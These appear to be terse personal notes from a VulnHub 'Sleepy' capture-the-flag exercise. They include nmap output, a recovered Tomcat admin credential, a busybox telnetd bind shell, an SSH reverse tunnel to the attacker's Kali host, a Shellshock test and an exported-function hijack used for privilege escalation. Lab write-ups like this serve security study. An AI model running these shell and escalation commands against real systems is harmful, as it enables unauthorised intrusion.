https://g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/
http://devloop.users.sourceforge.net/index.php?article138/solution-du-ctf-dev-random-sleepy-de-vulnhub

https://highon.coffee/blog/sleepy-ctf-walkthrough/

https://www.serma-safety-security.com/vulnerabilite-critique-sur-bash-cve-2014-6271-shellshock/

https://www.minttm.com/takeover-shellshocker-net


Machines : shellshock, symfonos 2, sleepy

└─$ sudo nmap -sT -A -T4 -Pn -n -p- 10.0.1.46 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 06:23 CET
Nmap scan report for 10.0.1.46
Host is up (0.00028s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.1.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
9001/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.6 1.7.0_71
|_jdwp-info: ERROR: Script execution failed (use -d to debug)
MAC Address: 08:00:27:7E:54:00 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13, Linux 3.10, Linux 3.4 - 3.10
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.28 ms 10.0.1.46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.78 seconds



get sleepy.png



user username="sl33py" password="Gu3SSmYStR0NgPa$sw0rD!" roles="tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status"/>

./busybox telnetd -l /bin/bash -p 4444

ssh kali@10.0.1.1 -R 4444:127.0.0.1:4444 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no


SHELLSHOCK
bash-4.2$ env x='() { :;}; echo vulnerable' bash -c "echo test"

bash-4.2$ function /usr/bin/sl () { /bin/bash; }
bash-4.2$ export -f /usr/bin/sl



